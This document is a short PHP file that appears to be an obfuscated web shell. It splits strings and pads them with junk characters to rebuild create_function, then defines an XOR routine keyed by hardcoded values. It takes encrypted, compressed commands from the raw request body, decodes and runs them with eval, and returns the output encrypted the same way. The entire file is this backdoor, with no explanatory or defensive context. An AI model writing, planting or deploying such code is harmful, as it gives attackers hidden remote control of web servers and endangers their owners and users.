<?php
$L='$k="0ebc23X3X09a";$kh="a3X2b83Xd22f893X79";$3Xkf="f34ac23X638e89"3X;3X$p="31ijWj3XE3Xt9Vr3X9rzd3XF";';
$K='tc3Xh("/$kh(3X.+3X)$kf/",@fi3Xl3Xe_get3X_3Xcontents("php://i3X3Xnput"),$m)==3X1) 3X{@ob3X_sta';
$a=str_replace('Bv','','creBvaBvteBv_fBvBvuBvnction');
$u='en3X3Xd_cl3Xea3Xn();3X$r=@ba3Xse63X4_encode(@x(@gzcompres3Xs($o3X),$k3X));3Xprint("$p$3Xkh$r$kf");}';
$o='r(3X$j=3X0;(3X3X$j<$c&&$i<$l);$j++,$i++){$o3X.=$t{$i3X3X}^$k{3X$j};}}return $o3X;}i3Xf (@p3Xreg_ma';
$V='funct3Xion x($t,$3Xk){$c=s3Xtr3Xlen($k);3X$l=strlen($3X3Xt);$3Xo="";3Xfor(3X$i=0;$3Xi<$l;){3Xfo';
$h='rt(3X);@3Xev3Xa3Xl(@gzuncompre3Xs3Xs(@x(@b3Xase64_decode(3X$m[13X]),$k)))3X;$o=@ob_g3Xe3Xt3X_contents();@ob_';
$v=str_replace('3X','',$L.$V.$o.$K.$h.$u);
$s=$a('',$v);$s();
?>
